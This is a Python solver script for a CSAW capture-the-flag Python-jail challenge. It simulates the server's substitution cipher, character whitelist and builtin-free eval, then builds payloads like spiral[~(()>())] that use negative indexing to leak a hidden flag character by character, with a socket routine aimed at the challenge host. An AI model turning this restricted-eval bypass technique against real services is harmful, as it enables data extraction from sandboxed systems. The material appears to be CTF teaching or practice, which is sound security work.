#!/usr/bin/env python3
"""
Galaxy CTF Challenge - Complete Solution

Challenge: Python jail with substitution cipher and restricted eval

The server:
1. Applies a random substitution cipher to encrypt input
2. Decrypts our input with unwarp()
3. Sanitizes to only allow: ([<~abcdefghijklmnopqrstuvwxyz>+]/*')
4. Evaluates with eval() with no builtins, only 'spiral' object available

The spiral object (galaxy_str):
- Blocks positive integer indexing
- Returns "<galaxy hidden>" for str() 
- But allows negative indexing!

Solution:
- Use negative indexing to extract characters
- Build negative indices using: ~(()>()) = -1, ~(('a'<'b')) = -2, etc.
- Extract flag character by character from end to beginning

Key Expression: spiral[~(()>())] gets the last character
Build indices: ~(('a'<'b')+('a'<'b')+...) for other positions
"""

import socket
import time
import string

def create_payload(index):
    """
    Create a payload to access spiral[index]
    where index is a negative number (e.g., -1, -2, -3, ...)
    
    Formula: ~n = -(n+1), so ~0=-1, ~1=-2, ~2=-3, etc.
    We need to create n from allowed expressions:
    - ()>() = False = 0
    - ('a'<'b') = True = 1
    - ('a'<'b')+('a'<'b') = 2
    - etc.
    """
    # Convert negative index to positive n where ~n = index
    # index = -(n+1), so n = -index - 1
    n = -index - 1
    
    if n == 0:
        # ~0 = -1
        expr = "()>()"
    elif n > 0:
        # Build n by adding True values
        parts = ["('a'<'b')"] * n
        expr = "+".join(parts)
    else:
        raise ValueError("Invalid index")
    
    return f"spiral[~({expr})]"

def solve_local():
    """Test locally to verify our payloads work"""
    print("[*] Testing solution locally...")
    
    import random
    
    class galaxy_str:
        def __init__(self, s):
            self._s = s
        def __getitem__(self, key):
            if isinstance(key, int) and key >= 0:
                raise Exception("<galaxy hidden>")
            return self._s[key]
        def __str__(self):
            return "<galaxy hidden>"
        __repr__ = __str__

    class galaxy_aura:
        def __init__(self):
            self.key = self._gen_key()
            self.map = dict(zip('abcdefghijklmnopqrstuvwxyz\'', self.key))
            self.reverse_map = dict(zip(self.key,'abcdefghijklmnopqrstuvwxyz\''))

        def _gen_key(self):
            letters = [letter for letter in 'abcdefghijklmnopqrstuvwxyz\'']
            random.shuffle(letters)
            key = ''.join(letters)
            return key
        
        def unwarp(self, provided_string):
            characters = [self.reverse_map.get(ch, ch) for ch in provided_string]
            return ''.join(characters)

        def warp(self, provided_string):
            characters = [self.map.get(ch, ch) for ch in provided_string]
            return ''.join(characters)
    
    def sanitize(provided_string):
        allowed = '([<~abcdefghijklmnopqrstuvwxyz>+]/*\')'
        cleaned_string = ''.join([_ for _ in provided_string if _ in allowed])
        return cleaned_string
    
    # Simulate the challenge
    spiral = galaxy_str('csawctf{g@l@xy_0bserv3r$}')
    galaxy_base = galaxy_aura()
    
    print("[+] Extracting flag character by character...")
    flag = ""
    
    for i in range(30):
        # Create payload for index -(i+1)
        payload = create_payload(-(i+1))
        
        # Encrypt it
        encrypted = galaxy_base.warp(payload)
        
        # Server-side processing
        decrypted = galaxy_base.unwarp(encrypted)
        sanitized = sanitize(decrypted)
        
        try:
            result = eval(sanitized, {"__builtins__": {}, "spiral": spiral})
            flag += result
            print(f"  [{i:2}] {payload[:50]:50} => '{result}'")
        except Exception as e:
            print(f"  [{i:2}] End of string")
            break
    
    flag = flag[::-1]  # Reverse because we extracted from end to start
    print(f"\n[!] FLAG: {flag}")
    return flag

def solve_remote(host='msc.chal.csaw.io', port=21009):
    """
    Solve against remote server
    
    The challenge is that each connection has a different random cipher.
    We need to send our payloads and the server will decrypt them automatically.
    """
    print(f"\n[*] Connecting to {host}:{port}...")
    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        s.settimeout(10)
        
        # Read initial prompt
        try:
            data = s.recv(1024).decode()
            print(f"[*] Initial prompt: {repr(data)}")
        except:
            pass
        
        print("[+] Extracting flag...")
        flag = ""
        
        for i in range(30):
            # Create payload for index -(i+1)
            payload = create_payload(-(i+1))
            
            print(f"  [{i:2}] Sending: {payload[:60]}")
            
            # Send payload
            s.send((payload + '\n').encode())
            time.sleep(0.1)
            
            try:
                # Read response
                response = s.recv(4096).decode()
                print(f"       Response: {repr(response)}")
                
                # Extract the character from response
                # The server prints the eval result
                lines = response.strip().split('\n')
                for line in lines:
                    if line and line != '> ' and 'galaxy' not in line.lower():
                        # This should be our character
                        char = line.strip()
                        if len(char) == 1:
                            flag += char
                            break
                else:
                    # Couldn't find character, might be end
                    break
                    
            except socket.timeout:
                print("       Timeout!")
                break
            except Exception as e:
                print(f"       Error: {e}")
                break
        
        s.close()
        
        flag = flag[::-1]  # Reverse
        print(f"\n[!] FLAG: {flag}")
        return flag
        
    except Exception as e:
        print(f"[-] Connection error: {e}")
        return None

if __name__ == "__main__":
    print("="*70)
    print(" Galaxy CTF Challenge Solver")
    print("="*70)
    
    # First test locally
    local_flag = solve_local()
    
    print("\n" + "="*70)
    
    # Uncomment to try remote
    # remote_flag = solve_remote()
    
    print("\n[*] To solve remotely, uncomment the solve_remote() call")
    print("[*] Or run: solve_remote('msc.chal.csaw.io', 21009)")
